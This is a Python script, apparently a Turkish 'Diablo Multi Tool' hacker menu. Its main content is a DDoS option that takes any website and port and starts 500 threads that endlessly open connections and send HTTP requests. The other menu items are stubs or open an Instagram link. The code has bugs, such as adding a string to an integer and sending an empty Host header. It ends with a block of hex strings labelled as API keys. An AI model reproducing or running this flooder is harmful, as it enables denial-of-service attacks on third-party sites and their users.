import subprocess
from pip._vendor.colorama import Fore
import threading
import time
import os
import socket, requests
import webbrowser
# Bu kodları değiştiren ahkalsızdır.

attack_num = 0

def ResetTool():
    while 1:
        multi()
        os.system("pause")

def multi(): 
    os.system('cls && title Diablo Multi Tool')
    print(f'''

    {Fore.RED}                      ████████▄   ▄█     ▄████████ ▀█████████▄   ▄█        ▄██████▄
    {Fore.RED}                      ███   ▀███ ███    ███    ███   ███    ███ ███       ███    ███
    {Fore.RED}                      ███    ███ ███▌   ███    ███   ███    ███ ███       ███    ███
    {Fore.RED}                      ███    ███ ███▌   ███    ███  ▄███▄▄▄██▀  ███       ███    ███
    {Fore.MAGENTA}                      ███    ███ ███▌ ▀███████████ ▀▀███▀▀▀██▄  ███       ███    ███
    {Fore.MAGENTA}                      ███    ███ ███    ███    ███   ███    ██▄ ███       ███    ███
    {Fore.MAGENTA}                      ███   ▄███ ███    ███    ███   ███    ███ ███▌    ▄ ███    ███
    {Fore.MAGENTA}                      ████████▀  █▀     ███    █▀  ▄█████████▀  █████▄▄██  ▀██████▀
                                                  
		    
                             {Fore.WHITE}[+]═════════════════════[+]═══════════════════[+]
	                      {Fore.WHITE}║ {Fore.LIGHTBLUE_EX}[1] - DDoS            {Fore.WHITE}║{Fore.LIGHTBLUE_EX} [4] - Proxy Down    {Fore.WHITE}║
		              {Fore.WHITE}║ {Fore.LIGHTBLUE_EX}[2] - Nmap Scaning    {Fore.WHITE}║{Fore.LIGHTBLUE_EX} [5] - Requirements  {Fore.WHITE}║
		              {Fore.WHITE}║ {Fore.LIGHTBLUE_EX}[3] - Discord Scan    {Fore.WHITE}║{Fore.LIGHTBLUE_EX} [6] - Next Page     {Fore.WHITE}║
		             {Fore.WHITE}[+]═════════════════════[+]═══════════════════[+]''')



    soru = input(Fore.RED+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Number"+Fore.RED+"""/
    └──╼ """+Fore.LIGHTBLUE_EX+"=> ")

    if soru == '1':
        attack_num = 0
        print(Fore.YELLOW+'Welcome to DDoS Atacker') ## Forked from https://github.com/DiabloAkar/L4ncelot-Diablo-dos-attack
        
        print(Fore.BLUE+"website url")
        target = input(Fore.RED+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Website"+Fore.RED+"""/
        └──╼ """+Fore.LIGHTRED_EX+"=> ")
        print("Enter the open port you are looking at through Port Scan")
        port = input(Fore.RED+" ┌─/"+Fore.LIGHTRED_EX+"Write Port"+Fore.RED+"""/
        └──╼ """+Fore.LIGHTRED_EX+"=> ")

        port = int(port)

     
        def attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + "\r\n\r\n").encode('ascii'), (target, port))
                global attack_num
                attack_num += 1
                packesnum =attack_num
                print(Fore.CYAN+'[!]'+"Paketler Gönderiliyor------> "+Fore.YELLOW+packesnum)
        
        print("AkarGang DDoS Sending Packets...")
        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()
    
    elif soru == "2":
        webbrowser.open_new_tab('https://www.instagram.com/diabloakar') ## Enter the code you want here



    else:
        multi()


ResetTool()



##Signed By Diablo Akar

## API
#a2f9172dde17c56592cc6cec63564108
#f1dc75461767bbb75c3a84ca2de45b54c0a2041e
#51e1739b20ee7cd6da2511222cd258fb
#43d72f4797ddc3a39f1785914cee642d3421d979
## API